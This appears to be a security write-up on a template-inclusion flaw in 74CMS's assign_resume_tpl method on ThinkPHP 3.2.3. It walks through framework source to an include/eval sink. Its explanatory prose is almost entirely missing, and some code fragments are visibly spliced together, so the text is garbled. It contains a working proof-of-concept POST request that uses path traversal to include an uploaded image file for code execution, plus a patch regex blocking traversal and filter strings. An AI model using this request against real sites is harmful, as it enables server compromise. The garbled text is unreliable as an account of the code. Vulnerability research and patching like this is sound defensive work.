CMS 
0x00 
 CMS  assign_resume_tpl 
http://www.74cms.com/news/show-2497.html
/Application/Common/Controller/BaseController.class.php  assign_resume_tpl 
0x01 
 CMS  Thinkphp  3.2.3 3.2.3  URL 
 CMS GET
 Home  User  login 
mca/GET
http://serverName/index.php///
http://localhost/?m=home&c=user&a=login&var=value
'VAR_MODULE'            =>  'module',     // 
'VAR_CONTROLLER'        =>  'controller',    // 
'VAR_ACTION'            =>  'action',    // 
http://localhost/?module=home&controller=user&action=login&var=value
0x02 
 /Application/Common/Controller/BaseController.class.php  assign_resume_tpl 
 $tpl  fetch() 
/ThinkPHP/Library/Think/View.class.php
 public function assign_resume_tpl($variable,$tpl){
        foreach ($variable as $key => $value) {
            $this->assign($key,$value);
        }
        return $this->fetch($tpl);
    }
 public function fetch($templateFile='',$content='',$prefix='') {
        if(empty($content)) {
            $templateFile   =   $this->parseTemplate($templateFile);
            // 
            if(!is_file($templateFile)) 
E(L('_TEMPLATE_NOT_EXIST_').':'.$templateFile);
        }else{
            defined('THEME_PATH') or    define('THEME_PATH', $this-
>getThemePath());
        }
        // 
        ob_start();
        ob_implicit_flush(0);
        if('php' == strtolower(C('TMPL_ENGINE_TYPE'))) { // PHP
            $_content   =   $content;
            // 
            extract($this->tVar, EXTR_OVERWRITE);
            // PHP
            empty($_content)?include $templateFile:eval('?>'.$_content);
        }else{
            // 
            $params = array('var'=>$this-
>tVar,'file'=>$templateFile,'content'=>$content,'prefix'=>$prefix);
            Hook::listen('view_parse',$params);
        }
        // 
        $content = ob_get_clean();
        // 
        Hook::listen('view_filter',$content);
        // 
        return $content;
    }
PHP
 /ThinkPHP/Conf/convention.php  111 
 CMS Think
Hook::listen()
view_parse
 /ThinkPHP/Library/Think/Hook.class.php  80 
    'TMPL_ENGINE_TYPE'      =>  'Think',     //  Think
    'TMPL_CACHFILE_SUFFIX'  =>  '.php',      // 
    'TMPL_DENY_FUNC_LIST'   =>  'echo,exit',    // 
    'TMPL_DENY_PHP'         =>  false, // PHP
 $params = array('var'=>$this-
>tVar,'file'=>$templateFile,'content'=>$content,'prefix'=>$prefix);
 Hook::listen('view_parse',$params);
/**
     * 
     * @param string $tag 
     * @param mixed $params 
     * @return void
     */
    static public function listen($tag, &$params=NULL) {
        if(isset(self::$tags[$tag])) {
            if(APP_DEBUG) {
                G($tag.'Start');
                trace('[ '.$tag.' ] --START--','','INFO');
            }
            foreach (self::$tags[$tag] as $name) {
                APP_DEBUG && G($name.'_start');
                $result =   self::exec($name, $tag,$params);
                if(APP_DEBUG){
                    G($name.'_end');
                    trace('Run '.$name.' [ 
RunTime:'.G($name.'_start',$name.'_end',6).'s ]','','INFO');
                }
                if(false === $result) {
                    // false 
                    return ;
                }
            }
            if(APP_DEBUG) { // 
                trace('[ '.$tag.' ] --END-- [ 
RunTime:'.G($tag.'Start',$tag.'End',6).'s ]','','INFO');
            }
        }
        return;
 view_parse ThinkPHP Hook::listen()  $tags 
 view_parse foreach $tags  Hook:exec 
Hook:exec  Behavior  run  run 
 Hook::listen  Hook /ThinkPHP/Mode/common.php 
 view_parse  ParseTemplateBehavior 
run
run
 /ThinkPHP/Library/Behavior/ParseTemplateBehavior.class.php 17 
    }
 /**
     * 
     * @param string $name 
     * @param string $tag      
     * @param Mixed $params 
     * @return void
     */
    static public function exec($name, $tag,&$params=NULL) {
        if('Behavior' == substr($name,-8) ){
            // run
            $tag    =   'run';
        }
        $addon   = new $name();
        return $addon->$tag($params);
    }
 // 
    'tags'  =>  array(
        'app_init'     =>  array(
            'Behavior\BuildLiteBehavior', // Lite
        ),        
        'app_begin'     =>  array(
            'Behavior\ReadHtmlCacheBehavior', // 
        ),
        'app_end'       =>  array(
            'Behavior\ShowPageTraceBehavior', // Trace
        ),
        'view_parse'    =>  array(
            'Behavior\ParseTemplateBehavior', //  PHP
        ),
        'template_filter'=> array(
            'Behavior\ContentReplaceBehavior', // 
        ),
        'view_filter'   =>  array(
            'Behavior\WriteHtmlCacheBehavior', // 
        ),
    ),
 fetch() 
 /ThinkPHP/Library/Think/Template.class.php 73 
class ParseTemplateBehavior {
    // run
    public function run(&$_data){
        $engine             =   strtolower(C('TMPL_ENGINE_TYPE'));
        $_content           =   empty($_data['content'])?
$_data['file']:$_data['content'];
        $_data['prefix']    =   !empty($_data['prefix'])?
$_data['prefix']:C('TMPL_CACHE_PREFIX');
        if('think'==$engine){ // Think
            if((!empty($_data['content']) && $this-
>checkContentCache($_data['content'],$_data['prefix'])) 
                ||  $this->checkCache($_data['file'],$_data['prefix'])) { 
                // 
                //
Storage::load(C('CACHE_PATH').$_data['prefix'].md5($_content).C('TMPL_CACHFILE_
SUFFIX'),$_data['var']);
            }else{
                $tpl = Think::instance('Think\\Template');
                // 
                $tpl->fetch($_content,$_data['var'],$_data['prefix']);
            }
        }else{
            // 
            if(strpos($engine,'\\')){
                $class  =   $engine;
            }else{
                $class   =  'Think\\Template\\Driver\\'.ucwords($engine);       
            }            
            if(class_exists($class)) {
                $tpl   =  new $class;
                $tpl->fetch($_content,$_data['var']);
            }else {  // 
                E(L('_NOT_SUPPORT_').': ' . $class);
            }
        }
    }
$tpl = Think::instance('Think\\Template');
// 
$tpl->fetch($_content,$_data['var'],$_data['prefix']);
    /**
     * 
     * @access public
     * @param string $templateFile    
     * @param array  $templateVar 
     * @param string $prefix 
     * @return void
     */
    public function fetch($templateFile,$templateVar,$prefix='') {
        $this->tVar         =   $templateVar;
        $templateCacheFile  =   $this->loadTemplate($templateFile,$prefix);
        Storage::load($templateCacheFile,$this->tVar,null,'tpl');
    }
/**
     * 
     * @access public
     * @param string $templateFile 
     * @param string $prefix 
     * @return string
     * @throws ThinkExecption
     */
    public function loadTemplate ($templateFile,$prefix='') {
        if(is_file($templateFile)) {
            $this->templateFile    =  $templateFile;
            // 
            $tmplContent =  file_get_contents($templateFile);
        }else{
            $tmplContent =  $templateFile;
        }
         // 
        $tmplCacheFile = $this-
>config['cache_path'].$prefix.md5($templateFile).$this->config['cache_suffix'];
        // 
        if(C('LAYOUT_ON')) {
            if(false !== strpos($tmplContent,'{__NOLAYOUT__}')) { // 
                $tmplContent = str_replace('{__NOLAYOUT__}','',$tmplContent);
            }else{ // 
                $layoutFile  =  THEME_PATH.C('LAYOUT_NAME').$this-
>config['template_suffix'];
                // 
                if(!is_file($layoutFile)) {
                    E(L('_TEMPLATE_NOT_EXIST_').':'.$layoutFile);
                }
                $tmplContent = str_replace($this-
>config['layout_item'],$tmplContent,file_get_contents($layoutFile));
            }
        }
        // 
        $tmplContent =  $this->compiler($tmplContent);
        Storage::put($tmplCacheFile,trim($tmplContent),'tpl');
        return $tmplCacheFile;
    }
 fetch()  loadTemplate  loadTemplate  $templateFile 
$tmplContent
compiler
 /ThinkPHP/Library/Think/Template.class.php 120 
 $tmplContent 
 loadTemplate 
 fetch()  loadTemplate 
Storage::load($templateCacheFile,$this->tVar,null,'tpl');
 /ThinkPHP/Library/Think/Storage/Driver/File.class.php 69 
/**
     * 
     * @access protected
     * @param mixed $tmplContent 
     * @return string
     */
    protected function compiler($tmplContent) {
        //
        $tmplContent =  $this->parse($tmplContent);
        // Literal
        $tmplContent =  preg_replace_callback('//is', 
array($this, 'restoreLiteral'), $tmplContent);
        // 
        $tmplContent =  ''.$tmplContent;
        // php
        $tmplContent = str_replace('?>compiler($tmplContent);
 Storage::put($tmplCacheFile,trim($tmplContent),'tpl');
 return $tmplCacheFile;
/**
     * 
     * @access public
     * @param string $filename  
     * @param array $vars  
     * @return void        
     */
    public function load($_filename,$vars=null){
        if(!is_null($vars)){
            extract($vars, EXTR_OVERWRITE);
        }
        include $_filename;
    } 
0x03 
 a assign_resume_tpl POST 
 PHP 
 PHP  CMS 
 /Application/Home/View/tpl_company/default/com_jobs_list.html
http://192.168.159.208/index.php?m=home&a=assign_resume_tpl
POST:
variable=1&tpl=../../../../var/www/html/data/upload/resume_img/2011/13/5fae95e4
69e05.jpg
 CMS 
docx 
0x04 
BaseController.class.php 169 assign_resume_tpl 
        $view = new \Think\View;
        $tpl_file = $view->parseTemplate($tpl);
        if(!is_file($tpl_file)){
            return false;
        }
2
 /ThinkPHP/Library/Think/View.class.php  View.class.php 106 fetch 
110
BaseController.class.php  assign_resume_tpl 
if(!is_file($templateFile)) E(L('_TEMPLATE_NOT_EXIST_').':'.$templateFile);
if(!is_file($templateFile)) E(L('_TEMPLATE_NOT_EXIST_'))
$pattern = "\.\/|\.\.\/|:|%00|%0a|=|~|@|file|php|filter|resource";
  if(preg_match("/".$pattern."/is",$tpl)== 1){
    return $this->_empty();
  }
0x05 
 fetch() 
 fastadmin  RCE 
0x06 
https://blog.csdn.net/qq_16877261/article/details/53484671
https://juejin.im/post/6844903982905688078
http://www.111com.net/phper/thinkPhp/104435.htm
https://www.kancloud.cn/manual/thinkphp/1697
http://www.74cms.com/news/show-2497.html